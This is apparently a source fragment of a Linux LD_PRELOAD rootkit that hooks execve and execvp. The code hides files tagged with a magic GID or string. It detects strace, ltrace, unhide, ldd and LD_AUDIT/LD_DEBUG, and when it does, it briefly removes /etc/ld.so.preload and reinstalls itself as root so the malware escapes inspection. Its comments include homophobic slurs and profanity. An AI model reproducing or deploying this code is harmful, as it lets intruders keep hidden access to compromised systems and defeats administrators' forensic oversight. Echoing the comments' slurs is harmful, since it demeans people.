#ifndef __arm__
#define STATIC_FSIZE 625824 // 640K ought to be enough for anybody... this should be enough for dynamic bins
// This filesize was determined from the size of the smallest possible glibc static bin compiled on a 32 bit system.
#else
#define STATIC_FSIZE REALLY_BIG
#endif
// This size was determined by  gcc -m32 -static -xc - <<< 'int main(){return 0;}'
char *sh_argv[] = {"/bin/sh","-i"};
int execvp(const char *file, char *const argv[]) { // Fucking nothing calls this.
  int pid,ret;
  if (!libc)libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_execvp) old_execvp = find_sym(libc, "execvp");
  if (!old_unlink) old_unlink = find_sym(libc,"unlink");
  // We need this for latrace. latrace is gay.
  if(getenv("LD_AUDIT")) {
    if(getuid()) { errno = EIO; return -1; }
    old_unlink("/etc/ld.so.preload");
    if ((pid=fork()) == -1) return -1;
    else if(pid == 0) return old_execvp(file, argv);
    wait(&ret);
    if(!geteuid()) reinstall_self();
    exit(0);
  }
  return old_execvp(file,argv);
}
int execve(const char *filename, char *const argv[], char *const envp[]){
  int i,pid,ret;
  struct stat s_fstat;
  if (!libc)libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_execve) old_execve = find_sym(libc, "execve");
  if (!old_fopen) old_fopen = find_sym(libc, "fopen");
  if (!old_unlink) old_unlink = find_sym(libc,"unlink");
  if (!old_xstat) old_xstat = find_sym(libc,"__xstat");
  memset(&s_fstat, 0, sizeof(stat));
  old_xstat(_STAT_VER, filename, &s_fstat);
  if((strstr(filename,MAGIC_STRING)||s_fstat.st_gid == MAGIC_GID) && getgid() != MAGIC_GID) { errno = ENOENT; return -1; }
  if(getgid() == MAGIC_GID) return old_execve(filename,argv,envp);
  if(!strcmp(filename,"/bin/bash") || !strcmp(filename,"/bin/sh") || !strcmp(filename,"/usr/local/bin/bash")) return old_execve(filename,argv,envp); // bash is big and gay
  if(s_fstat.st_size > STATIC_FSIZE && strstr(filename,"busybox") && argv[1] != NULL  && (!strcmp(argv[1],"sh") || !strcmp(argv[1],"ash"))) {
    return execve("/bin/sh", sh_argv, envp); // make sure we recurse over this with the env checks later.
  }

  if(strstr(get_my_procname(),"unhide") && (!strcmp(filename,"/bin/ps") || !strcmp(filename,"ps"))) {
          if(getuid()) { errno = EIO; return -1; }
          old_unlink("/etc/ld.so.preload");
          if ((pid=fork()) == -1) return -1;
          else if(pid == 0) return old_execve(filename, argv, envp);
          wait(&ret);
          if(!geteuid()) reinstall_self();
          exit(0);
  }
  if(s_fstat.st_size > STATIC_FSIZE || strstr(filename,"strace") || strstr(filename,"ltrace") || !fnmatch("*/unhide", filename, FNM_PATHNAME) || (strstr(filename,"unhide") && !strstr(filename,"unhide.rb") )) {

          if(getuid()) { errno = EIO; return -1; }
          old_unlink("/etc/ld.so.preload");
          if ((pid=fork()) == -1) return -1;
          else if(pid == 0) return old_execve(filename, argv, envp);
          wait(&ret);
          if(!geteuid()) reinstall_self();
          exit(0);
  }
  if(!fnmatch("*/*ld-linux*.so.*",filename,FNM_PATHNAME) || !fnmatch("*/*ld-*.so",filename,FNM_PATHNAME)) {
   for(i=0;argv[i]!=NULL;i++) {
      if(!strcmp(argv[i],"--list")) {
          if(getuid()) { errno = EIO; return -1; }
          old_unlink("/etc/ld.so.preload");
          if ((pid=fork()) == -1) return -1;
          else if(pid == 0) return old_execve(filename, argv, envp);
          wait(&ret);
          if(!geteuid()) reinstall_self();
          exit(0);
        }
      }
    }
  for(i=0; envp[i]!=NULL; i++) {
    if(strstr(envp[i],"LD_TRACE_LOADED_OBJECTS=") || strstr(envp[i],"LD_DEBUG=") || strstr(envp[i],"LD_AUDIT=") || getenv("LD_AUDIT")) {
      if(getuid()) { errno = EIO; return -1; }
      old_unlink("/etc/ld.so.preload");
      if ((pid=fork()) == -1) return -1;
      else if(pid == 0) return old_execve(filename, argv, envp);
      wait(&ret);
      if(!geteuid()) reinstall_self();
      exit(0);
    }
  }
  if(!geteuid()) reinstall_self();
  return old_execve(filename,argv,envp);
}

